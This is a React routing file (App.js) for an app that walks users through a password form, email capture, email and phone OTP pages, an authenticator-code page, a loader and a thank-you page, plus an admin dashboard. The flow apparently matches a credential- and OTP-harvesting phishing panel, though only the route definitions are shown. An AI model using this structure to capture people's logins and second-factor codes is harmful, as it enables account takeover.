import React from "react";
import { BrowserRouter as Router, Route, Routes } from "react-router-dom";
import UserPage from "./pages/UserPage";
import AdminLoginPage from "./components/Admin/AdminLoginPage";
import AdminDashboard from "./components/Admin/AdminDashboard";
import UsernamePasswordForm from "./components/User/UsernamePasswordForm";
import EmailCaptureForm from "./components/User/EmailCaptureForm";
import OTPToEmail from "./components/User/OTPToEmail";
import OTPToPhone from "./components/User/OTPToNumber"; // Ensure this exists
import AuthenticatorOtpForm from "./components/User/AuthenticatorOtpForm"; // Ensure this exists
import Loader from "./components/User/Loader";
import ProtectedRoute from "./components/Admin/ProtectedRoute";
import Unauthorized from "./components/Admin/Unauthorized";
import PhoneNumberForm from "./components/User/PhoneNumberForm";
import ThankYouPage from "./components/User/ThankYouPage";

const App = () => {
  return (
    <Router>
      <Routes>
        {/* Admin Routes */}
        <Route path="/admin-login" element={<AdminLoginPage />} />
        <Route
          path="/admin-dashboard"
          element={
            <ProtectedRoute>
              <AdminDashboard />
            </ProtectedRoute>
          }
        />
        <Route path="/unauthorized" element={<Unauthorized />} />
        <Route path="/thank-you" element={<ThankYouPage />} />
        {/* User Routes */}
        <Route element={<UserPage />}>
          <Route path="/login" element={<UsernamePasswordForm />} />
        </Route>
        <Route path="/email-page" element={<EmailCaptureForm />} />
        <Route path="/email-otp-page" element={<OTPToEmail />} />
        <Route path="/phone-number-page" element={<PhoneNumberForm />} />
        <Route path="/phone-otp-page" element={<OTPToPhone />} />
        <Route
          path="/authenticator-otp-page"
          element={<AuthenticatorOtpForm />}
        />
        {/* Add route for authenticator */}
        <Route path="/loader" element={<Loader />} />
        {/* Default User Page */}
        <Route path="/" element={<UserPage />} />
      </Routes>
    </Router>
  );
};

export default App;
